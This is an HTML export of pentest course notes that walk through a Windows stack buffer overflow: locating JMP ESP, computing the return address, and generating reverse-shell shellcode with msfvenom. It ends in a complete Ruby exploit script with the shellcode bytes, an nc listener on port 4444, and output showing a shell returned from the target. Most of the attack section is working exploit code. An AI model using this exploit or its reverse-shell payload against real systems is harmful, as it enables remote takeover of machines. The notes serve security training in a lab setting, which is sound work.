<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>script Ruby: Overwrite the EIP & Execute the Shellcode</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>script Ruby: Overwrite the EIP & Execute the Shellcode</h1><br/><br /><a href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/ruby/stack_server.png"><img src="images/2031-1.png" alt="images/2031-1.png" /></a><br /><br />Check also the chapter for the Local Systems: <a href="est_Methodology--Network_Pentest--Exploitation--Buffer_Overflow--Example_1_(outdated)_exploit_Buffer_Overflow_loacally--Overwrite_the_EIP.html">Overwrite the EIP</a><br /><br /><span style="text-decoration:underline;">Immunity Debugger:</span> To find JMP <strong><span style="color:#ff0000;">ESP</span></strong> (or CALL ESP) in the application we can simply disassemble it(with Immunity Debugger or IDA) and then search for the instruction in all the modules and libraries loaded by the program we have to select <strong>Search for →  All Commands in all modules</strong><br /><br />To do that <span style="text-decoration:underline;">first load and start the service</span>, after is waiting for a connection search JMP ESP.<br />	<a href=""><img src="images/2031-2.png" alt="images/2031-2.png" /></a><br />	copy an address that point to <span style="text-decoration:underline;">JMP/CALL command to a kernel module</span>(<span style="text-decoration:underline;">kernel32.dll</span> or kernelbase.dll) and add it to the payload in hexadecimal and in a swapped order(Big Endian)<br />	<span style="color:#a52a2a;">example:</span> the address 75365CE5 must be written as \xE5\x5C\x36\x75<br /><br /><br /><strong><h3>Preamble</h3></strong><br />The Preamble are the Junk Bytes needed to reach the EIP. <br />We have seen, in the chapter before <a href="t_Methodology--Network_Pentest--Exploitation--Buffer_Overflow--Example_2_(outdated)_Buffer_Overflow_service_server--Find_the_right_offset.html">Find the Right Offset</a>, that the length of this Preamble is <strong>44</strong>. This mean we can insert 44 times NOP(\x90)<br /><div class="codebox"><div class="codebox">preamble&nbsp;=&nbsp;44*&quot;\x90&quot;</div></div><br />because as address for the JMP/CALL to the <strong><span style="color:#ff0000;">ESP</span></strong> we have taken 75365CE5, write it i Big Endian<br /><div class="codebox"><div class="codebox">return_address&nbsp;=&nbsp;&quot;\xE5\x5C\x36\x75&quot;</div></div><br />After the <span style="color:#ffff00;">return address</span>(EIP), there is space allocated for the arguments passed to call the function. We need to insert enough NOPs(we do not need to know the exact space) to overwrite it before the real malicious payload. <br /><div class="codebox"><div class="codebox">arguments_nop&nbsp;=&nbsp;10*&quot;\x90&quot;&nbsp;</div></div><br /><br /><strong>Generate Shellcode</strong><br />Review the chapter <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding.html">Shellcoding</a> and in particular <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding--Automate_creation_of_shellcode.html">Automate creation of a shellcode</a><br /><span style="text-decoration:underline;">msfvenom</span> is a combination of the old msfpayload and msfencode, putting both of these tools into a single Framework<br />   ◇ msfpayload → generate the malicious payload<br />   ◇ msfencode → encode the payload in order to avoid bad characters<br />1. List available payloads:<br />	<div class="codebox"><div class="codebox">msfvenom&nbsp;--list&nbsp;payloads</div></div><br />2. Show options for a payload<br />	<div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;&lt;name_of_the_msfvenom_payload&gt;&nbsp;--list-options</div></div><br /><br /><strong>Shellcode reverse shell</strong><br /><div class="codebox"><div class="codebox">msfvenom&nbsp;--list&nbsp;payloads</div></div><br />In this example we will use windows/shell_reverse_tcp that connect back to attacker and spawn a command shell<br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;--list-options</div></div><br />	<a href=""><img src="images/2031-3.png" alt="images/2031-3.png" /></a><br />	<br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;RHOST=192.168.3.136&nbsp;LPORT=4444&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;Windows&nbsp;-b&nbsp;&#39;\x00&#39;&nbsp;--format&nbsp;ruby</div></div> <br />	-b ‘\x00’  → Since the vulnerability is caused by a strcpy in a C++ application, we must avoid the &#39;\x00&#39; character (end of line); this is because strcpy will stop the copy if it encounters these bytes.<br />	<a href=""><img src="images/2031-4.png" alt="images/2031-4.png" /></a><br /><br /><strong><h3>Final Payload</h3></strong><br /><br />Run Calculator on the victim<br /><div class="codebox"><div class="codebox">#bufferOverflowServer.rb<br /><br />preamble&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;44<br />return_address&nbsp;=&nbsp;&quot;\xE5\x5C\x36\x75&quot;<br />arguments_nop&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;10&nbsp;<br />buf&nbsp;=&nbsp;<br />&quot;\xba\xd1\xaa\x60\xa3\xd9\xc4\xd9\x74\x24\xf4\x5d\x2b\xc9&quot;&nbsp;+<br />&quot;\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\x84\xa4\x82\x56\xda&quot;&nbsp;+<br />&quot;\x51\xc0\x99\x22\xa2\xa5\x10\xc7\x93\xe5\x47\x8c\x84\xd5&quot;&nbsp;+<br />&quot;\x0c\xc0\x28\x9d\x41\xf0\xbb\xd3\x4d\xf7\x0c\x59\xa8\x36&quot;&nbsp;+<br />&quot;\x8c\xf2\x88\x59\x0e\x09\xdd\xb9\x2f\xc2\x10\xb8\x68\x3f&quot;&nbsp;+<br />&quot;\xd8\xe8\x21\x4b\x4f\x1c\x45\x01\x4c\x97\x15\x87\xd4\x44&quot;&nbsp;+<br />&quot;\xed\xa6\xf5\xdb\x65\xf1\xd5\xda\xaa\x89\x5f\xc4\xaf\xb4&quot;&nbsp;+<br />&quot;\x16\x7f\x1b\x42\xa9\xa9\x55\xab\x06\x94\x59\x5e\x56\xd1&quot;&nbsp;+<br />&quot;\x5e\x81\x2d\x2b\x9d\x3c\x36\xe8\xdf\x9a\xb3\xea\x78\x68&quot;&nbsp;+<br />&quot;\x63\xd6\x79\xbd\xf2\x9d\x76\x0a\x70\xf9\x9a\x8d\x55\x72&quot;&nbsp;+<br />&quot;\xa6\x06\x58\x54\x2e\x5c\x7f\x70\x6a\x06\x1e\x21\xd6\xe9&quot;&nbsp;+<br />&quot;\x1f\x31\xb9\x56\xba\x3a\x54\x82\xb7\x61\x31\x67\xfa\x99&quot;&nbsp;+<br />&quot;\xc1\xef\x8d\xea\xf3\xb0\x25\x64\xb8\x39\xe0\x73\xbf\x13&quot;&nbsp;+<br />&quot;\x54\xeb\x3e\x9c\xa5\x22\x85\xc8\xf5\x5c\x2c\x71\x9e\x9c&quot;&nbsp;+<br />&quot;\xd1\xa4\x31\xcc\x7d\x17\xf2\xbc\x3d\xc7\x9a\xd6\xb1\x38&quot;&nbsp;+<br />&quot;\xba\xd9\x1b\x51\x51\x20\xcc\x9e\x0e\x29\x84\x77\x4d\x2d&quot;&nbsp;+<br />&quot;\x85\xdb\xd8\xcb\xcf\xf3\x8c\x44\x78\x6d\x95\x1e\x19\x72&quot;&nbsp;+<br />&quot;\x03\x5b\x19\xf8\xa0\x9c\xd4\x09\xcc\x8e\x81\xf9\x9b\xec&quot;&nbsp;+<br />&quot;\x04\x05\x36\x98\xcb\x94\xdd\x58\x85\x84\x49\x0f\xc2\x7b&quot;&nbsp;+<br />&quot;\x80\xc5\xfe\x22\x3a\xfb\x02\xb2\x05\xbf\xd8\x07\x8b\x3e&quot;&nbsp;+<br />&quot;\xac\x3c\xaf\x50\x68\xbc\xeb\x04\x24\xeb\xa5\xf2\x82\x45&quot;&nbsp;+<br />&quot;\x04\xac\x5c\x39\xce\x38\x18\x71\xd1\x3e\x25\x5c\xa7\xde&quot;&nbsp;+<br />&quot;\x94\x09\xfe\xe1\x19\xde\xf6\x9a\x47\x7e\xf8\x71\xcc\x8e&quot;&nbsp;+<br />&quot;\xb3\xdb\x65\x07\x1a\x8e\x37\x4a\x9d\x65\x7b\x73\x1e\x8f&quot;&nbsp;+<br />&quot;\x04\x80\x3e\xfa\x01\xcc\xf8\x17\x78\x5d\x6d\x17\x2f\x5e&quot;&nbsp;+<br />&quot;\xa4&quot;<br /><br />exploit=&nbsp;preamble&nbsp;+&nbsp;return_address&nbsp;+&nbsp;arguments_nop&nbsp;+&nbsp;buf<br />host,port=&nbsp;ARGV[0],&nbsp;ARGV[1]<br />require&nbsp;&#39;socket&#39;<br />TCPSocket.open(host,port)&nbsp;<span style="color:#000000;font-weight:400">{</span>|s|&nbsp;s.puts&nbsp;exploit<span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><span style="color:#ff0000;">Attacker</span>:<br />1. Listen for the target<br />	<div class="codebox"><div class="codebox">nc&nbsp;-nvlp&nbsp;4444</div></div><br />	<a href=""><img src="images/2031-5.png" alt="images/2031-5.png" /></a><br />2. The IpAddress and port are the one of the Service on the Target machine<br />	<div class="codebox"><div class="codebox">ruby&nbsp;bufferOverflowServer.rb&nbsp;192.168.3.133&nbsp;7707</div></div><br />	<a href=""><img src="images/2031-6.png" alt="images/2031-6.png" /></a><br /><span style="color:#0000ff;">Target/Server machine</span>:<br />	<a href=""><img src="images/2031-7.png" alt="images/2031-7.png" /></a><br />	<a href=""><img src="images/2031-8.png" alt="images/2031-8.png" /></a><br />	 The service connected back to our listener on the target. The exploit works<br /><br /><br /><br /><br /><br /><br /></div>
</body>
</html>
